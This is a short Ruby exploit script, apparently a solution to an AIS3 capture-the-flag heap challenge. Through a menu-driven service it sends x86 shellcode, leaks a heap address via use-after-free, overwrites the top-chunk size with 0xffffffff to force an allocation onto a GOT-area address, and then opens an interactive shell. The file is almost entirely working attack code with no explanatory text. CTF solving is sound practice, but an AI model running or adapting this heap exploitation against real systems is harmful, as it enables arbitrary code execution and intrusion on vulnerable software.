#!/usr/bin/env ruby

require '~/Tools/pwnlib'

host, port = '127.0.0.1', 4444
host, port = 'quiz.ais3.org', 5071

def add(size, content)
	@r.recv_until("Your choice :")
	@r.send("3\n")
	@r.recv_until("Size:")
	@r.send("#{size}\n")
	@r.recv_until("Content:")
	@r.send("#{content}\n")
end

def delete(index)
	@r.recv_until("Your choice :")
	@r.send("5\n")
	@r.recv_until("index:")
	@r.send("#{index}\n")	
end

def show(index)
	@r.recv_until("Your choice :")
	@r.send("4\n")
	@r.recv_until("index:")
	@r.send("#{index}\n")
	return @r.recv_capture(/Content:(.*)\n/)[0].unpack("L")[0]
end
def p32(*address)
	return address.pack("L*")
end
PwnTube.open(host, port) do |r|
	@r = r
	@r.recv()	
	@r.send(PwnLib.shellcode_x86)
	
	add(32,"aa")
	add(32,"aa")
	add(32,"aa")
	delete(1)
	delete(0)
	heap = show(0)
	puts "[!] heap : #{heap}"
#=begin
	add(128,"a"*128)
	delete(3)
	add(128,"a"*132+p32(0xffffffff))
	puts "[!] malloc : #{(0x804a000-heap-(heap-0x804a000))}"
	add( (0x804a000-heap-0xb8) , "aaaa")
	#add(-0x1000,"aaaa")
	add(30, "bbbb")
	add(30, "bbbb")
	add(30, "a"*4+p32(0x804a0e0))
#=end
	@r.recv_until("Your choice :")
	@r.send("6\n")
	@r.interactive()
end
